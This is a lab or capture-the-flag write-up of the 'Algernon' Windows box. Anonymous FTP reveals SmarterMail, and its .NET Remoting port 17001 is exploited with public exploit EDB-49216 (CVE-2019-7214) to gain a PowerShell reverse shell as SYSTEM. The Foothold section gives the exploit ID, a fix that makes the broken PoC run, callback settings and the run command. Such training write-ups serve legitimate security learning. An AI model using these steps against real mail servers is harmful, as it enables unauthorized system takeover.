#Windows #SmarterMail #DotNetDeserialization #CVE-2019-7214 #RCE #AnonymousFTP #SYSTEM

## Overview

Algernon is a Windows box where anonymous FTP access reveals a SmarterMail installation, and the .NET Remoting endpoint exposed on port 17001 is vulnerable to a .NET deserialization attack (CVE-2019-7214) that executes a PowerShell reverse shell as SYSTEM, no privilege escalation step needed. The main obstacle documented in the notes is a Unicode zero-width space character embedded in the public PoC that causes a Python syntax error.

## Recon

### Port Scan

```sh
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     Microsoft ftpd   (anonymous login allowed)
80/tcp    open  http    Microsoft IIS 10.0
135/tcp   open  msrpc   Microsoft Windows RPC
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9998/tcp  open  http    Microsoft IIS 10.0  (redirects to /interface/root)
17001/tcp open  remoting MS .NET Remoting services
```

Port 17001 is the critical find: `.NET Remoting services`. Port 9998 serves the SmarterMail web interface.

### FTP Enumeration

Anonymous FTP gave access to four directories:

```sh
ftp anonymous@192.168.180.65
04-29-20  10:31PM  <DIR>  ImapRetrieval
07-11-22  09:08AM  <DIR>  Logs
04-29-20  10:31PM  <DIR>  PopRetrieval
04-29-20  10:32PM  <DIR>  Spool
```

The directory names (`ImapRetrieval`, `PopRetrieval`, `Spool`) confirm this is a SmarterMail installation. Log file review found nothing actionable, but the directory structure confirmed the application and its version context.

## Foothold

### SmarterMail .NET Deserialization RCE (CVE-2019-7214)

SmarterMail before build 6985 exposes a .NET Remoting endpoint that accepts serialized .NET objects without authentication. An attacker can craft a malicious serialized payload that, when deserialized by the server, executes arbitrary code.

Exploit: **SmarterMail Build 6985 - Remote Code Execution** (EDB-49216)

> **Why .NET Remoting deserialization is exploitable:** .NET Remoting is a legacy inter-process communication framework that serializes objects for transmission. If the receiving endpoint deserializes attacker-supplied data using a `BinaryFormatter` or similar, it calls object constructors and property setters during deserialization, which can be chained (via "gadget chains") to execute OS commands. The exploit encodes a PowerShell reverse shell into a base64-encoded command, stuffs it into the serialized payload, and sends it to port 17001.

The public PoC (EDB-49216) embedded invisible Unicode zero-width space characters (U+200B) that caused Python to error:

```python
SyntaxError: invalid non-printable character U+200B
```

Fix with `sed`:

```sh
sed -i 's/\xe2\x80\x8b//g' 49216.py
```

After setting the target and callback details in the script:

```python
HOST='192.168.180.65'
PORT=17001
LHOST='192.168.45.244'
LPORT=80
```

Running the exploit delivered a PowerShell reverse shell as SYSTEM:

```sh
python3 49216.py
```

The deserialization payload invokes `powershell.exe -encodedCommand <base64>`, which connects back to the listener. SmarterMail's service process runs as SYSTEM, so the shell lands with full privileges, no escalation required.

## Root

```powershell
C:\Windows\system32> whoami
nt authority\system
```

> **Note:** the source notes confirm SYSTEM access was achieved and the box was rooted, but the proof.txt content was not recorded in the engagement notes.

## Takeaways

- **`.NET Remoting` on a non-standard port is a high-priority target.** Pre-2020 builds of SmarterMail (and other products using legacy Remoting) are unauthenticated deserialization endpoints.
- **Public PoC scripts may contain hidden Unicode characters that break interpreters.** When a Python script fails with `SyntaxError: invalid non-printable character`, `sed` stripping zero-width spaces (U+200B, bytes `\xe2\x80\x8b`) is the reliable fix.
- **Application service accounts frequently run as SYSTEM on Windows.** A service-level RCE often means no privilege escalation is needed, the initial shell is already the highest privilege level on the box.
